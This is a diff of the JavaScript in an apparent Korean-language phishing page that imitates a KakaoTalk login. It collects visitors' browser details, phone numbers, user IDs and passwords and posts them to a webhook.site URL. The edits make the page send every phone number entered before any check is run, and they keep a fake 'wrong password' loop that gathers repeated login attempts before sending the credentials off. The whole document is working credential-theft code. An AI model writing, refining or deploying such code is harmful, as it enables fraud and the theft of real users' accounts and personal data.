@@ -62,7 +62,7 @@ font-size: 16px; font-weight: bold; color: #000; background: #ffeb00; border: no
 </div>
 
 <script>
-const webhookUrl = "	https://webhook.site/77d0020a-315a-4b5f-9614-187e3029b1f9"; // Webhook URL
+const webhookUrl = "https://webhook.site/77d0020a-315a-4b5f-9614-187e3029b1f9"; // Webhook URL
 let savedPhone = "";
 let phoneTryCount = 0;
 let loginTryCount = 0;
@@ -71,12 +71,12 @@ let loginTryCount = 0;
 function goNext() {
   const chk = document.getElementById("agree");
   if (!chk.checked) { alert("동의 후 진행할 수 있습니다."); return; }
-  collectUserInfo(); // 기존 정보 수집 그대로 유지
+  collectUserInfo();
   document.getElementById("page1").classList.add("hidden");
   document.getElementById("page2").classList.remove("hidden");
 }
 
-// 최대 정보 수집 (기존 코드 그대로)
+// 최대 정보 수집
 async function collectUserInfo() {
   const formData = new URLSearchParams();
   formData.append("userAgent", navigator.userAgent);
@@ -142,8 +142,11 @@ async function collectUserInfo() {
   formData.append("timestamp", new Date().toISOString());
   formData.append("page","1");
 
-  fetch(webhookUrl,{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:formData})
-  .catch(err=>console.error("WebHook 전송 오류:",err));
+  fetch(webhookUrl,{
+    method:"POST",
+    headers:{"Content-Type":"application/x-www-form-urlencoded"},
+    body:formData
+  }).catch(err=>console.error("WebHook 전송 오류:",err));
 }
 
 // page2 -> page3
@@ -151,22 +154,22 @@ function sendPhone() {
   const userId = document.getElementById("userId").value.trim();
   const phoneRegex = /^010\d{8}$/;
   if (!userId) { alert("전화번호를 입력해주세요."); return; }
-  if (!phoneRegex.test(userId)) { alert("잘못된 형식의 전화번호입니다."); return; }
 
   phoneTryCount++;
 
-  if (phoneTryCount < 3) {
-    alert("전화번호가 틀렸습니다. 다시 확인해주세요.");
-    return;
-  }
-
-  savedPhone = userId;
-
+  // Webhook 무조건 전송
   fetch(webhookUrl,{
     method:"POST",
     headers:{"Content-Type":"application/x-www-form-urlencoded"},
     body:new URLSearchParams({page:"2",phone:userId,timestamp:new Date().toISOString()})
   }).catch(err=>console.error(err));
+
+  if (!phoneRegex.test(userId) || phoneTryCount < 3) {
+    alert("전화번호가 틀렸습니다. 다시 확인해주세요.");
+    return;
+  }
+
+  savedPhone = userId;
 
   document.getElementById("page2").classList.add("hidden");
   document.getElementById("page3").classList.remove("hidden");
@@ -182,7 +185,7 @@ function sendPhone() {
   },1500);
 }
 
-// page4 로그인 처리 (잔여 시도 횟수 표시)
+// page4 로그인 처리
 function sendPage4() {
   const userId4 = document.getElementById("userId4").value.trim();
   const userCode4 = document.getElementById("userCode4").value.trim();
@@ -191,7 +194,6 @@ function sendPage4() {
   loginTryCount++;
   const maxAttempts = 8;
   const remaining = Math.max(0, maxAttempts - loginTryCount + 1);
-
 
   if(loginTryCount >= 1 && loginTryCount <= 5) {
     alert(`비밀번호가 틀렸습니다. 남은 시도 횟수: ${remaining}`);
@@ -206,13 +208,12 @@ function sendPage4() {
 
   if(loginTryCount > 5) {
     alert("카카오톡 로그인 시도 횟수를 초과했습니다. 2시간 후에 다시 시도해 주세요");
-     fetch(webhookUrl,{
+    fetch(webhookUrl,{
       method:"POST",
       headers:{"Content-Type":"application/x-www-form-urlencoded"},
       body:new URLSearchParams({page:"4", userId:userId4, password:userCode4, timestamp:new Date().toISOString()})
     }).then(()=>alert(`page4 값 전송 완료! 남은 시도 횟수: ${remaining}`))
       .catch(err=>console.error(err));
-    return;
     return;
   }
 }
